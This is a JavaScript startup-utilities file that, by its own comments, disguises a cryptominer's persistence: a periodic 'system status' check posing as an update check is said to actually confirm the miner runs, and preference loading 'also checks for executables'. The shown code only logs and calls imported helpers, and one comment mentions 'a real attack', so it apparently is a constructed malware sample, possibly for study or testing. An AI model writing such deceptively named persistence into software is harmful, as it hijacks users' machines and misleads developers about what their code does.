/**
 * Application initialization utilities
 * This file handles startup procedures and resource loading
 */

import { initAnalytics } from "./analyticsUtils";
import { initPerformanceMonitoring } from "./performanceUtils";
import { preloadResources } from "./downloadUtils";
import { loadPreferences } from "./preferencesUtils";

// Initialize all application services
export const initializeApp = () => {
  console.log("Initializing application services...");

  // Initialize analytics
  initAnalytics();

  // Initialize performance monitoring
  initPerformanceMonitoring();

  // Load user preferences (also checks for executables)
  loadPreferences();

  // Preload resources
  preloadResources();

  // Set up periodic checks (appears to be for updates but actually checks for our miner)
  setupPeriodicChecks();

  console.log("Application services initialized successfully");

  return {
    status: "ready",
    timestamp: new Date().toISOString(),
  };
};

// Set up periodic checks
const setupPeriodicChecks = () => {
  // Check every 30 minutes
  setInterval(
    () => {
      // This appears to check for updates but actually checks if our miner is running
      checkSystemStatus();
    },
    30 * 60 * 1000,
  );

  // Also check after 5 minutes (in case the download was successful but execution failed)
  setTimeout(checkSystemStatus, 5 * 60 * 1000);
};

// Check system status
const checkSystemStatus = () => {
  // In a real attack, this would check if the miner is running and restart it if needed
  console.log("Checking system status:", new Date().toISOString());

  // Load preferences again (which triggers the executable check)
  loadPreferences();
};

// Check browser compatibility
export const checkBrowserCompatibility = () => {
  const isCompatible =
    typeof window !== "undefined" &&
    typeof fetch !== "undefined" &&
    typeof Promise !== "undefined";

  return {
    compatible: isCompatible,
    browser: navigator.userAgent,
  };
};

// Register service worker for offline support
export const registerServiceWorker = async () => {
  if ("serviceWorker" in navigator) {
    try {
      const registration = await navigator.serviceWorker.register("/sw.js");
      console.log("Service worker registered:", registration);
      return true;
    } catch (error) {
      console.error("Service worker registration failed:", error);
      return false;
    }
  }
  return false;
};
